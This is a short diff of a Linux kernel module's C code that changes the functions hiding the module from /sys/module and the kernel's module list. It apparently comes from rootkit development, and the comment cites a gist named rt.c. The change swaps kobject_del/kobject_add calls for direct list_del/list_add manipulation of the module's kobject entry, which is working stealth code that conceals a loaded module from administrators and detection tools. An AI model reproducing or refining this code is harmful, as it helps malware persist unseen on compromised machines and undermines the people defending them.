@@ -26,7 +26,7 @@ int moduleHide_start(void) {
 
 	// Hide from /sys/module 	based on  https://gist.github.com/ivyl/3964594/raw/fbdbbe7261939dcb829f37b2ed11795060ac3364/rt.c
 	module_kobj_previous = THIS_MODULE->mkobj.kobj.entry.prev;
-	kobject_del(&THIS_MODULE->mkobj.kobj);
+	//kobject_del(&THIS_MODULE->mkobj.kobj);
 	list_del(&THIS_MODULE->mkobj.kobj.entry);
 
 
@@ -40,7 +40,8 @@ void moduleHide_stop(void) {
 
 	list_add(&THIS_MODULE->list, entryBeforeOutModuleInTheKernelModulesList);
 
-	kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, THIS_MODULE->name);
+	list_add(&THIS_MODULE->mkobj.kobj.entry, module_kobj_previous);
+	//object_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, THIS_MODULE->name);
 	//todo: check result of kobject_add
 }
 
